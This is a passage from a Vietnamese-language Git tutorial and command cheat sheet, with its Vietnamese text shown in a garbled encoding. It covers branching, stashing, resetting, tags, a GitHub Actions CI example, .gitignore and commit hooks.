# 3a4b5c6d (John Doe  2024-11-01 10:30:00 +0700  15) export function calculateTax() {
# â†’ John Doe viáº¿t dÃ²ng nÃ y â†’ Há»i John náº¿u conflict

# 2. Git Log - Xem lá»‹ch sá»­ file
git log --oneline src/utils.ts
# a1b2c3d feat: add calculateTax
# f4e5d6c fix: update calculateTotal
# â†’ Hiá»ƒu file thay Ä‘á»•i nhÆ° tháº¿ nÃ o

# 3. Git Diff - So sÃ¡nh changes
git diff main...feature/my-feature
# â†’ Xem táº¥t cáº£ changes giá»¯a main vÃ  feature branch

# 4. Git Stash - Táº¡m cáº¥t code chÆ°a commit
# TÃ¬nh huá»‘ng: Äang code dá»Ÿ, cáº§n pull code má»›i
git stash  # Cáº¥t code Ä‘ang lÃ m
git pull origin main
git stash pop  # Láº¥y code ra tiáº¿p tá»¥c

# 5. Git Reflog - "Time machine" (lÆ°u má»i thay Ä‘á»•i)
git reflog
# Náº¿u lÃ m sai (merge nháº§m, rebase lá»—i) â†’ quay láº¡i!
git reset --hard HEAD@{2}  # Quay láº¡i 2 bÆ°á»›c trÆ°á»›c
```

---

### **5. CI/CD vá»›i Git Workflow**

```yaml
# .github/workflows/ci.yml (GitHub Actions)
name: CI/CD Pipeline

on:
  push:
    branches: [main, develop]  # Cháº¡y khi push vÃ o main/develop
  pull_request:
    branches: [main, develop]  # Cháº¡y khi táº¡o PR

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      # 1. Install dependencies
      - name: Install
        run: npm ci
      
      # 2. Lint code
      - name: Lint
        run: npm run lint
      
      # 3. Run tests
      - name: Test
        run: npm test
      
      # 4. Build
      - name: Build
        run: npm run build
      
      # 5. Deploy (chá»‰ khi merge vÃ o main)
      - name: Deploy
        if: github.ref == 'refs/heads/main'
        run: npm run deploy

# Lá»£i Ã­ch:
# - Má»i PR pháº£i pass tests má»›i Ä‘Æ°á»£c merge
# - Auto deploy khi merge vÃ o main
# - PhÃ¡t hiá»‡n bugs sá»›m (trÆ°á»›c khi merge)
```

---

### **6. Git Commands Cheat Sheet - CÃ¡c Lá»‡nh Git ThÆ°á»ng DÃ¹ng** ğŸ“

#### **6.1. Setup & Configuration**

```bash
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 1. CONFIG - Cáº¥u hÃ¬nh Git
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Set tÃªn vÃ  email (báº¯t buá»™c cho má»i commit)
git config --global user.name "Nguyen Van A"
git config --global user.email "vana@company.com"

# Xem táº¥t cáº£ config
git config --list

# Set editor máº·c Ä‘á»‹nh (VS Code, Vim, Nano...)
git config --global core.editor "code --wait"  # VS Code
git config --global core.editor "vim"          # Vim

# Báº­t mÃ u sáº¯c trong terminal (dá»… Ä‘á»c hÆ¡n)
git config --global color.ui auto

# Alias - Táº¡o shortcut cho lá»‡nh dÃ i
git config --global alias.st status           # git st = git status
git config --global alias.co checkout         # git co = git checkout
git config --global alias.br branch           # git br = git branch
git config --global alias.cm "commit -m"      # git cm "message" = git commit -m "message"
git config --global alias.last "log -1 HEAD" # Xem commit cuá»‘i cÃ¹ng
git config --global alias.unstage "reset HEAD --"  # Bá» file khá»i staging

# Set line ending (quan trá»ng khi team cÃ³ Windows + Mac)
git config --global core.autocrlf true   # Windows
git config --global core.autocrlf input  # Mac/Linux

# LÆ°u credentials (khÃ´ng cáº§n nháº­p password má»—i láº§n)
git config --global credential.helper cache  # Cache 15 phÃºt
git config --global credential.helper store  # LÆ°u vÄ©nh viá»…n (khÃ´ng an toÃ n)
git config --global credential.helper "cache --timeout=3600"  # Cache 1 giá»
```

---

#### **6.2. Repository Operations**

```bash
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 2. INIT & CLONE - Táº¡o má»›i hoáº·c clone repo
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Táº¡o repo má»›i tá»« folder hiá»‡n táº¡i
git init
git init my-project  # Táº¡o folder má»›i + init git

# Clone repo tá»« remote
git clone https://github.com/username/repo.git
git clone https://github.com/username/repo.git my-folder  # Clone vÃ o folder tÃªn khÃ¡c
git clone --depth 1 https://github.com/username/repo.git  # Shallow clone (chá»‰ láº¥y commit má»›i nháº¥t)

# Clone specific branch
git clone -b develop https://github.com/username/repo.git

# Add remote repository
git remote add origin https://github.com/username/repo.git

# Xem danh sÃ¡ch remotes
git remote -v

# Äá»•i URL remote (khi Ä‘á»•i repo)
git remote set-url origin https://github.com/username/new-repo.git

# XÃ³a remote
git remote remove origin
```

---

#### **6.3. Basic Workflow Commands**

```bash
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 3. STATUS & DIFF - Xem thay Ä‘á»•i
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Xem tráº¡ng thÃ¡i hiá»‡n táº¡i (file nÃ o Ä‘Ã£ thay Ä‘á»•i)
git status
git status -s  # Short format (ngáº¯n gá»n hÆ¡n)

# Xem chi tiáº¿t thay Ä‘á»•i (chÆ°a staging)
git diff
git diff src/app.ts  # Xem changes cá»§a file cá»¥ thá»ƒ

# Xem changes Ä‘Ã£ staging (chuáº©n bá»‹ commit)
git diff --staged
git diff --cached  # TÆ°Æ¡ng tá»± --staged

# So sÃ¡nh 2 branches
git diff main..feature/login
git diff main...feature/login  # 3 dots = so sÃ¡nh tá»« merge-base

# So sÃ¡nh 2 commits
git diff a1b2c3d f4e5d6c

# Xem thay Ä‘á»•i cá»§a 1 file qua cÃ¡c commits
git log -p src/app.ts


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 4. ADD & COMMIT - LÆ°u thay Ä‘á»•i
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Add file vÃ o staging area
git add src/app.ts                    # Add 1 file
git add src/                          # Add cáº£ folder
git add .                             # Add táº¥t cáº£ files
git add *.ts                          # Add táº¥t cáº£ file .ts
git add -p                            # Add tá»«ng pháº§n (interactive)

# Remove file khá»i staging (nhÆ°ng giá»¯ changes)
git reset HEAD src/app.ts
git restore --staged src/app.ts       # Git 2.23+

# Discard changes (XÃ“A changes, cáº©n tháº­n!)
git checkout -- src/app.ts            # Git cÅ©
git restore src/app.ts                # Git 2.23+

# Commit changes
git commit -m "feat: add login feature"
git commit -m "fix: resolve login bug" -m "Detailed description here"

# Commit táº¥t cáº£ changes (tracked files) - bá» qua git add
git commit -am "fix: update logic"

# Amend commit cuá»‘i (sá»­a commit message hoáº·c thÃªm files)
git add forgotten-file.ts
git commit --amend                     # Má»Ÿ editor Ä‘á»ƒ sá»­a message
git commit --amend -m "New message"    # Sá»­a message trá»±c tiáº¿p
git commit --amend --no-edit           # ThÃªm files mÃ  khÃ´ng Ä‘á»•i message

# Táº¡o empty commit (dÃ¹ng Ä‘á»ƒ trigger CI/CD)
git commit --allow-empty -m "chore: trigger CI"


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 5. PUSH & PULL - Äá»“ng bá»™ vá»›i remote
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Push lÃªn remote
git push origin main                   # Push branch main
git push origin feature/login          # Push branch feature
git push -u origin feature/login       # Push + set upstream (láº§n Ä‘áº§u)
git push                               # Push (náº¿u Ä‘Ã£ set upstream)

# Force push (Cáº¨N THáº¬N! Ghi Ä‘Ã¨ lá»‹ch sá»­ remote)
git push --force                       # âš ï¸ Nguy hiá»ƒm!
git push --force-with-lease            # âœ… An toÃ n hÆ¡n (kiá»ƒm tra trÆ°á»›c khi force)

# Push tags
git push origin v1.0.0                 # Push 1 tag
git push origin --tags                 # Push táº¥t cáº£ tags

# Pull tá»« remote
git pull origin main                   # Pull tá»« main
git pull                               # Pull tá»« upstream branch
git pull --rebase                      # Pull + rebase thay vÃ¬ merge

# Fetch (láº¥y vá» nhÆ°ng khÃ´ng merge)
git fetch origin                       # Fetch táº¥t cáº£ branches
git fetch origin main                  # Fetch chá»‰ branch main
git fetch --all                        # Fetch tá»« táº¥t cáº£ remotes
git fetch --prune                      # XÃ³a references khÃ´ng cÃ²n trÃªn remote
```

---

#### **6.4. Branch Management**

```bash
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 6. BRANCH - Quáº£n lÃ½ nhÃ¡nh
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Xem danh sÃ¡ch branches
git branch                             # Local branches
git branch -r                          # Remote branches
git branch -a                          # Táº¥t cáº£ (local + remote)
git branch -v                          # Vá»›i commit message cuá»‘i

# Táº¡o branch má»›i
git branch feature/login               # Táº¡o nhÆ°ng khÃ´ng chuyá»ƒn sang
git checkout -b feature/login          # Táº¡o + chuyá»ƒn sang
git switch -c feature/login            # Git 2.23+ (khuyáº¿n nghá»‹)

# Chuyá»ƒn branch
git checkout main                      # Git cÅ©
git switch main                        # Git 2.23+

# Äá»•i tÃªn branch
git branch -m old-name new-name        # Äá»•i tÃªn branch khÃ¡c
git branch -m new-name                 # Äá»•i tÃªn branch hiá»‡n táº¡i

# XÃ³a branch
git branch -d feature/login            # XÃ³a local (safe - Ä‘Ã£ merge)
git branch -D feature/login            # Force xÃ³a local (chÆ°a merge)
git push origin --delete feature/login # XÃ³a remote branch

# Track remote branch
git checkout -b feature/login origin/feature/login
git switch -c feature/login --track origin/feature/login

# Xem branch nÃ o Ä‘Ã£ merge vÃ o main
git branch --merged main
git branch --no-merged main            # NgÆ°á»£c láº¡i
```

---

#### **6.5. Merge & Rebase**

```bash
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 7. MERGE - Gá»™p nhÃ¡nh
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Merge branch vÃ o branch hiá»‡n táº¡i
git checkout main
git merge feature/login                # Merge feature vÃ o main

# Merge vá»›i commit message custom
git merge feature/login -m "Merge login feature"

# Merge nhÆ°ng khÃ´ng fast-forward (luÃ´n táº¡o merge commit)
git merge --no-ff feature/login

# Há»§y merge Ä‘ang conflict
git merge --abort

# Xem files conflict
git status
git diff --name-only --diff-filter=U  # Chá»‰ xem tÃªn files conflict


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 8. REBASE - Táº¡o lá»‹ch sá»­ tuyáº¿n tÃ­nh
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Rebase branch hiá»‡n táº¡i lÃªn main
git checkout feature/login
git rebase main

# Rebase interactive (chá»‰nh sá»­a commits)
git rebase -i HEAD~3                   # Chá»‰nh sá»­a 3 commits gáº§n nháº¥t
git rebase -i main                     # Rebase tá»« main

# Continue/Skip/Abort rebase
git rebase --continue                  # Tiáº¿p tá»¥c sau khi resolve conflict
git rebase --skip                      # Bá» qua commit hiá»‡n táº¡i
git rebase --abort                     # Há»§y rebase, quay láº¡i tráº¡ng thÃ¡i ban Ä‘áº§u

# Rebase vÃ  force push (cáº©n tháº­n!)
git rebase main
git push --force-with-lease            # âœ… An toÃ n hÆ¡n force
```

---

#### **6.6. Stash - Táº¡m cáº¥t code**

```bash
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 9. STASH - Cáº¥t code táº¡m thá»i
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Stash changes
git stash                              # Cáº¥t táº¥t cáº£ changes
git stash save "work in progress"      # Stash vá»›i message
git stash -u                           # Stash cáº£ untracked files
git stash --include-untracked          # TÆ°Æ¡ng tá»± -u

# Xem danh sÃ¡ch stashes
git stash list
# stash@{0}: WIP on main: a1b2c3d commit message
# stash@{1}: On feature: work in progress

# Apply stash (láº¥y ra nhÆ°ng giá»¯ trong stash list)
git stash apply                        # Apply stash má»›i nháº¥t
git stash apply stash@{1}              # Apply stash cá»¥ thá»ƒ

# Pop stash (láº¥y ra VÃ€ xÃ³a khá»i stash list)
git stash pop                          # Pop stash má»›i nháº¥t
git stash pop stash@{1}                # Pop stash cá»¥ thá»ƒ

# XÃ³a stash
git stash drop stash@{0}               # XÃ³a 1 stash
git stash clear                        # XÃ³a táº¥t cáº£ stashes

# Táº¡o branch tá»« stash
git stash branch feature/from-stash stash@{0}

# Xem changes trong stash
git stash show                         # Summary
git stash show -p                      # Full diff
git stash show stash@{1} -p           # Xem stash cá»¥ thá»ƒ
```

---

#### **6.7. Log & History**

```bash
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 10. LOG - Xem lá»‹ch sá»­ commits
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Xem lá»‹ch sá»­ commits
git log                                # Full log
git log --oneline                      # 1 dÃ²ng má»—i commit
git log --oneline --graph              # Vá»›i graph (branches)
git log --oneline --graph --all        # Táº¥t cáº£ branches

# Giá»›i háº¡n sá»‘ lÆ°á»£ng commits
git log -5                             # 5 commits gáº§n nháº¥t
git log -n 10                          # 10 commits gáº§n nháº¥t

# Log vá»›i filter
git log --author="John Doe"            # Commits cá»§a John
git log --since="2 weeks ago"          # 2 tuáº§n gáº§n Ä‘Ã¢y
git log --until="2024-11-01"           # TrÆ°á»›c ngÃ y 1/11/2024
git log --grep="fix"                   # Commit message cÃ³ "fix"

# Log cá»§a 1 file
git log src/app.ts                     # Lá»‹ch sá»­ file
git log -p src/app.ts                  # Vá»›i full diff
git log --follow src/app.ts            # Follow khi file rename

# Pretty format
git log --pretty=format:"%h - %an, %ar : %s"
# a1b2c3d - John Doe, 2 days ago : fix: resolve bug

# Xem ai viáº¿t dÃ²ng nÃ o (blame)
git blame src/app.ts
git blame -L 10,20 src/app.ts          # Chá»‰ dÃ²ng 10-20

# Xem changes cá»§a 1 commit
git show a1b2c3d
git show a1b2c3d:src/app.ts            # Xem ná»™i dung file táº¡i commit Ä‘Ã³
```

---

#### **6.8. Undo & Reset**

```bash
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 11. RESET & REVERT - Undo changes
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Reset vá» commit trÆ°á»›c (XÃ“A commits)
git reset HEAD~1                       # Vá» 1 commit trÆ°á»›c, GIá»® changes
git reset --soft HEAD~1                # Vá» 1 commit trÆ°á»›c, changes vÃ o staging
git reset --mixed HEAD~1               # Default, changes thÃ nh unstaged
git reset --hard HEAD~1                # âš ï¸ XÃ“A HOÃ€N TOÃ€N changes!

git reset a1b2c3d                      # Reset vá» commit cá»¥ thá»ƒ
git reset --hard origin/main           # Reset vá» giá»‘ng remote

# Revert commit (Táº O commit má»›i Ä‘á»ƒ undo)
git revert a1b2c3d                     # Revert 1 commit (an toÃ n cho public branch)
git revert HEAD                        # Revert commit cuá»‘i
git revert --no-commit a1b2c3d         # Revert nhÆ°ng chÆ°a commit

# Unstage files (bá» khá»i staging area)
git reset HEAD src/app.ts              # Git cÅ©
git restore --staged src/app.ts        # Git 2.23+

# Discard changes (XÃ“A changes chÆ°a commit)
git checkout -- src/app.ts             # Git cÅ©
git restore src/app.ts                 # Git 2.23+ âœ…

# XÃ³a untracked files
git clean -n                           # Dry-run (xem sáº½ xÃ³a gÃ¬)
git clean -f                           # XÃ³a untracked files
git clean -fd                          # XÃ³a cáº£ folders
git clean -fX                          # XÃ³a chá»‰ files trong .gitignore
git clean -fx                          # XÃ³a táº¥t cáº£ (bao gá»“m .gitignore)
```

---

#### **6.9. Tags**

```bash
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 12. TAG - ÄÃ¡nh dáº¥u versions
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Xem danh sÃ¡ch tags
git tag
git tag -l "v1.*"                      # Filter tags

# Táº¡o tag
git tag v1.0.0                         # Lightweight tag
git tag -a v1.0.0 -m "Release 1.0.0"   # Annotated tag (khuyáº¿n nghá»‹)

# Tag commit cÅ©
git tag -a v0.9.0 a1b2c3d -m "Version 0.9.0"

# Xem thÃ´ng tin tag
git show v1.0.0

# Push tags lÃªn remote
git push origin v1.0.0                 # Push 1 tag
git push origin --tags                 # Push táº¥t cáº£ tags

# XÃ³a tag
git tag -d v1.0.0                      # XÃ³a local
git push origin --delete v1.0.0        # XÃ³a remote

# Checkout tag (xem code táº¡i version cÅ©)
git checkout v1.0.0                    # Detached HEAD state
git checkout -b branch-from-tag v1.0.0 # Táº¡o branch tá»« tag
```

---

#### **6.10. Advanced Commands**

```bash
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 13. REFLOG - Time machine Git
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Xem táº¥t cáº£ thay Ä‘á»•i (ká»ƒ cáº£ Ä‘Ã£ xÃ³a)
git reflog
git reflog show main                   # Reflog cá»§a branch main

# Quay láº¡i tráº¡ng thÃ¡i trÆ°á»›c (undo má»i thá»©!)
git reset --hard HEAD@{2}              # Quay láº¡i 2 bÆ°á»›c trÆ°á»›c
git reset --hard a1b2c3d               # Quay láº¡i commit cá»¥ thá»ƒ (tá»« reflog)

# Reflog expire (xÃ³a old entries)
git reflog expire --expire=30.days --all


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 14. CHERRY-PICK - Copy commit tá»« branch khÃ¡c
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Pick 1 commit tá»« branch khÃ¡c
git cherry-pick a1b2c3d                # Copy commit a1b2c3d vÃ o branch hiá»‡n táº¡i
git cherry-pick a1b2c3d f4e5d6c        # Pick nhiá»u commits

# Cherry-pick vá»›i conflict
git cherry-pick --continue             # Continue sau khi resolve
git cherry-pick --abort                # Há»§y cherry-pick

# Cherry-pick khÃ´ng commit ngay
git cherry-pick -n a1b2c3d             # Stage changes nhÆ°ng chÆ°a commit


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 15. BISECT - TÃ¬m commit gÃ¢y bug (binary search)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Start bisect
git bisect start
git bisect bad                         # Commit hiá»‡n táº¡i cÃ³ bug
git bisect good v1.0.0                 # Commit v1.0.0 khÃ´ng cÃ³ bug

# Git sáº½ checkout commit á»Ÿ giá»¯a, test xem cÃ³ bug khÃ´ng
# Náº¿u cÃ³ bug:
git bisect bad
# Náº¿u khÃ´ng cÃ³ bug:
git bisect good

# Repeat cho Ä‘áº¿n khi tÃ¬m ra commit gÃ¢y bug

# End bisect
git bisect reset


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 16. WORKTREE - Nhiá»u working directories
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Táº¡o worktree má»›i (lÃ m viá»‡c nhiá»u branches cÃ¹ng lÃºc)
git worktree add ../my-feature feature/login
# Táº¡o folder ../my-feature chá»©a code cá»§a feature/login
# LÃ m viá»‡c 2 branches Ä‘á»“ng thá»i mÃ  khÃ´ng cáº§n stash!

# List worktrees
git worktree list

# Remove worktree
git worktree remove ../my-feature
git worktree prune                     # Cleanup old worktrees


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 17. SUBMODULE - Quáº£n lÃ½ dependencies
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Add submodule
git submodule add https://github.com/user/repo.git libs/repo

# Clone repo vá»›i submodules
git clone --recursive https://github.com/user/repo.git

# Update submodules
git submodule update --init --recursive

# Pull submodule changes
git submodule update --remote


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 18. GIT SHORTCUTS - Alias há»¯u Ã­ch
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# ThÃªm vÃ o ~/.gitconfig hoáº·c cháº¡y git config --global

git config --global alias.co checkout
git config --global alias.br branch
git config --global alias.ci commit
git config --global alias.st status

# Undo last commit (giá»¯ changes)
git config --global alias.undo 'reset HEAD~1 --mixed'

# Pretty log
git config --global alias.lg "log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit"

# Xem branches sorted by last commit
git config --global alias.recent "branch --sort=-committerdate"

# Amend without editing message
git config --global alias.cane 'commit --amend --no-edit'

# Force push with lease
git config --global alias.pushf 'push --force-with-lease'
```

---

#### **6.11. .gitignore Patterns**

```bash
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# .gitignore - Bá» qua files khÃ´ng cáº§n track
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Táº¡o file .gitignore
cat > .gitignore << EOF
# Dependencies
node_modules/
vendor/

# Build outputs
dist/
build/
*.min.js
*.min.css

# Environment variables
.env
.env.local
.env.*.local

# IDE
.vscode/
.idea/
*.swp
*.swo
*~

# OS
.DS_Store
Thumbs.db

# Logs
*.log
logs/

# Testing
coverage/
.nyc_output/

# Temporary
tmp/
temp/
*.tmp
EOF

# Ignore file Ä‘Ã£ tracked (nhÆ°ng giá»¯ trong git history)
git rm --cached file.txt               # Remove from index
git rm -r --cached folder/             # Remove folder

# Xem files bá»‹ ignore
git status --ignored

# Check xem file cÃ³ bá»‹ ignore khÃ´ng
git check-ignore -v file.txt

# Táº¡o global .gitignore (Ã¡p dá»¥ng cho táº¥t cáº£ repos)
git config --global core.excludesfile ~/.gitignore_global
```

---

#### **6.12. Git Hooks (Automation)**

```bash
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Git Hooks - Tá»± Ä‘á»™ng cháº¡y scripts
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Hooks náº±m trong .git/hooks/
# Hoáº·c dÃ¹ng tools: Husky (Node.js), pre-commit (Python)

# Example: pre-commit hook (format code trÆ°á»›c khi commit)
# File: .git/hooks/pre-commit
#!/bin/sh
npm run lint
npm run format

# Náº¿u lá»—i (exit code != 0) â†’ commit bá»‹ há»§y

# Example: commit-msg hook (validate commit message)
# File: .git/hooks/commit-msg
#!/bin/sh
commit_msg=$(cat $1)
if ! echo "$commit_msg" | grep -qE "^(feat|fix|docs|chore):"; then
  echo "âŒ Commit message pháº£i báº¯t Ä‘áº§u báº±ng: feat|fix|docs|chore"
  exit 1
fi

# DÃ¹ng Husky (Node.js) - dá»… hÆ¡n
npm install --save-dev husky
npx husky install
npx husky add .husky/pre-commit "npm run lint"
npx husky add .husky/commit-msg 'npx --no -- commitlint --edit "$1"'
```

---

### **ğŸ“Š TÃ³m Táº¯t So SÃ¡nh**

| Model | PhÃ¹ há»£p | Æ¯u Ä‘iá»ƒm | NhÆ°á»£c Ä‘iá»ƒm |
|-------|---------|---------|------------|
| **Git Flow** | Dá»± Ã¡n lá»›n, release theo version | RÃµ rÃ ng, quáº£n lÃ½ tá»‘t | Phá»©c táº¡p, nhiá»u conflicts |
| **GitHub Flow** | CI/CD, deploy liÃªn tá»¥c | ÄÆ¡n giáº£n, Ã­t conflicts | KhÃ³ quáº£n lÃ½ versions |
